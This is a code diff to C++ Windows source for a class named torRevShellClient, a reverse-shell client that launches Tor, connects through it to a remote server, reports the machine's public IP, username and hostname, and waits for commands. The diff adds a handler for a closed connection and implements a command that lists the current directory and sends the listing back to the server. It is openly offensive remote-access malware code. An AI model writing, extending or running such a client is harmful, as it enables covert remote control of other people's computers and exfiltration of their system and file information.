@@ -5,6 +5,7 @@
 #include <string>
 #include <Windows.h>
 #include <lmcons.h>
+#include <filesystem>
 
 /*
     Contains code for connecting to the server and processing commands
@@ -46,7 +47,7 @@ public:
         Starts TOR and sets up some basic info
     */
     torRevShellClient(std::string torPath, std::string servAddr){
-        this->torSock.startAndConnectToProxy(".\\tor.exe");
+        this->torSock.startTorProxy(torPath.c_str());
         this->servAddr = servAddr;
         this->getComputerInfo();
     }
@@ -56,6 +57,7 @@ public:
         Returns true if a successful response from server is received ("<ip>;<username>;<hostname>;connected;")
     */
     bool attemptConnect() {
+        this->torSock.connectToProxy();
         printf("Attempting to connect to %s\n", this->servAddr.c_str());
         this->torSock.connectProxyTo(this->servAddr.c_str());
         std::string connReq = this->publicIp + ";" + this->username + ";" + this->hostname + ";";
@@ -78,7 +80,10 @@ public:
         }
         while (1) {
             char cmdBuff[1024] = { 0 };
-            this->torSock.proxyRecv(cmdBuff, 1024);
+            int bytesReceived = this->torSock.proxyRecv(cmdBuff, 1024);
+            if (bytesReceived <= 0) {
+                return;
+            }
             std::string cmd = cmdBuff; // Convert for easier handling
             printf("CMD: %s\n", cmd.c_str());
             if (cmd == "ping;") {
@@ -114,8 +119,16 @@ public:
     }
 
     void ls() {
-        // .... TODO
-        this->torSock.proxySend("ls; todo :)", 13);
+        // Get a list of the files and folders in the current directory
+        std::string response = "ls;";
+        for (const auto& entry : std::filesystem::directory_iterator(std::filesystem::current_path())) {
+            response += entry.path().filename().string();
+            if (entry.is_directory()) {
+                response += "/";
+            }
+            response += ";";
+        }
+        this->torSock.proxySend(response.c_str(), response.size());
     }
     
 };
